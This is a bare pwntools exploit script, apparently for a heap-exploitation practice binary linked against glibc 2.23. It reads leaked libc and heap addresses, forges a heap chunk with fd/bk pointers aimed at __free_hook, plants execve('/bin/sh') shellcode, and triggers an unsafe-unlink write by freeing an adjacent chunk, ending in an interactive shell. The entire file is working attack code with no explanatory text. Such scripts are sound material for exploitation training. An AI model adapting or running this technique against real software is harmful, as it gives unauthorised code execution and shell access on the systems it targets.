#!/usr/bin/python3
from pwn import *

exe = ELF("./unsafe_unlink_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe

script = '''
c
'''

def start():
    if args.GDB:
        return gdb.debug(exe.path,gdbscript=script)
    else:
        return process(exe.path)

p = process()


def add(size,):
    p.send(b'1')
    p.sendlineafter(b'size: ',f"{size}")

def edit(index,data):
    p.send(b'2')
    p.sendlineafter(b'index: ',f"{index}")
    p.sendafter(b'data: ',data)

def free(idx):
    p.sendafter(b'> ',b'3')
    p.sendlineafter(b'index: ',f"{idx}".encode())

p = start()

p.recvuntil(b'puts() @ ')
leak_libc = int(p.recvline()[:-1],16) - libc.sym.puts
p.recvuntil(b'@ ')
heap = int(p.recvline()[:-1],16)
shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))

log.success(f"leak libc: {hex(leak_libc)} and leak heap {hex(heap)}")
input()
add(0x88)
add(0x88)
fd = libc.sym.__free_hook - 0x18
bk = heap + 0x20
prev_size = 0x90
fake_size = 0x90

edit(0, p64(fd) + p64(bk) + shellcode + p8(0)*(0x70 - len(shellcode)) + p64(prev_size) + p64(fake_size))
input()
free(1)



p.interactive()

